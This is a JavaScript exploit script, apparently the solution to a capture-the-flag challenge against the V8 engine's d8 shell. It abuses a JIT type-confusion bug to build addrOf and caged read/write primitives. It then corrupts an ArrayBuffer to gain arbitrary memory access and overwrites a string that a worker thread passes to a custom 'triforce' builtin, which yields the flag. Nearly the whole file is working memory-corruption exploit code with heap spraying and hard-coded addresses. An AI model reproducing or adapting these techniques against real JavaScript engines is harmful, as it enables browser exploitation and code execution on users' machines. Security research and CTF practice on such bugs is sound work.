const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

const EMPTY_PROPERTIES_ADDR = 0x7e5n;
const MAP_JSARR_PACKED_DOUBLES_ADDR = 0x100ba71n;
const FIXED_ARRAY = 0x38c002an;
let FIXED_OBJ_ARRAY = 0x8d00018n;
const EVIL_SMI = (Number(FIXED_ARRAY) / 2);
let flag = {};

function itof(x) {
  conv_u64[0] = BigInt(x);
  return conv_f64[0];
}

function ftoi(x) {
  conv_f64[0] = x;
  return conv_u64[0];
}

function spin(ms) {
  let end = Date.now() + ms;
  while(Date.now() < end);
};

function gc() {
  new ArrayBuffer(1);
  new ArrayBuffer(1);
  new ArrayBuffer(2 ** 30);
}

const spray = new Array(0x4fe0000/8); //FixedDoubleArray address should be constant
spray[2] = itof(MAP_JSARR_PACKED_DOUBLES_ADDR << 8n);
spray[3] = itof(FIXED_OBJ_ARRAY >> 8n);

function trigger(obj, x) {  
  let y = x[0]; //x must be an HeapObj
  y += 0.1;
  obj.p = x; //no check here :)
  return y;
}

let target = { p: {a: 1} };
target.p = [1.1, 2.2, 3.3];

function get(x) {
  return x.p[0];
}

function set(x, y) {
  x.p[0] = y;
}

for (let i = 0; i < 1000; i++) {
  get(target);
  set(target, 1.1);
}

for (let i = 0; i < 1000; i++) {
  trigger(target, [1.1]);
}

spin(1000);

trigger(target, EVIL_SMI);

function caged_write(x, y) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  const tmp = ftoi(get(target)) & 0xffffffff00000000n;
  set(target, itof(tmp | BigInt(y)));
}

function caged_read(x) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  return (ftoi(get(target))) & 0xffffffffn;
}

const spray2 = new Array(0x4fe0000/8);
spray2[0] = spray2;

const marker = caged_read(FIXED_OBJ_ARRAY-8n);

if (marker != 0x5ddn) {
  print("Unexpected obj array marker: " + marker.toString(16) + ", fixing offset...");
  FIXED_OBJ_ARRAY = 0x8cc0018n;
}

function addrOf(obj) {
  spray2[0] = obj;
  return Number(caged_read(FIXED_OBJ_ARRAY)) & 0xffffffff;
}

let sbox_buf = new ArrayBuffer(0x1337);

function build_primitives() {
  let sbox_buf_addr = addrOf(sbox_buf) & ~1;

  caged_write(sbox_buf_addr + 0x14, 0xe0000000);
  caged_write(sbox_buf_addr + 0x18, 0xffffffff);

  caged_write(sbox_buf_addr + 0x1c, 0xe0000000);
  caged_write(sbox_buf_addr + 0x20, 0xffffffff);

  caged_write(sbox_buf_addr + 0x24, 0x00000000);
  caged_write(sbox_buf_addr + 0x28, 0x00000000);
}
build_primitives();

let sbox_view = new DataView(sbox_buf);
r32 = (addr) => sbox_view.getUint32(addr, true);
w32 = (addr, val) => sbox_view.setUint32(addr, val, true);

gc();
gc();

let workerScript = `
function spin(ms) {
  let end = Date.now() + ms;
  while(Date.now() < end);
};

function gc() {
  new ArrayBuffer(1);
  new ArrayBuffer(1);
  new ArrayBuffer(2 ** 30);
}

let arr = new Array(0x2000).fill(0x42);
arr[0] = 0x4d;
arr[1] = 0x41;
arr[2] = 0x52;
arr[3] = 0x4b;
const str = String.fromCharCode(...arr);

gc();
gc();

while(1){
  let a;
  try { 
    a = triforce(str);
  } catch(e) {
    continue;
  }
  print("Sending flag to main thread...");
  postMessage(a);  
  break;
}
`;

let worker = new Worker(workerScript, {type: 'string'});
worker.onmessage = (e) => {
  print("Received message from worker");
  flag = e.data;
  print("Flag from worker: " + flag);
}

spin(2000);

let addr = 0x8922c00;

for (; r32(addr) != 0x4b52414d; addr+=4) {}

print("Found string marker at: " + addr.toString(16));

w32(addr - 0x4, 5); //len
w32(addr, 0x65776f50); //Power
w32(addr + 0x4, 0x72);
spin(1000);

w32(addr - 0x4, 6); //len
w32(addr, 0x64736957); //Wisdom
w32(addr + 0x4, 0x6d6f);
spin(1000);

w32(addr - 0x4, 7); //len
w32(addr, 0x72756f43); //Courage
w32(addr + 0x4, 0x656761);
spin(1000);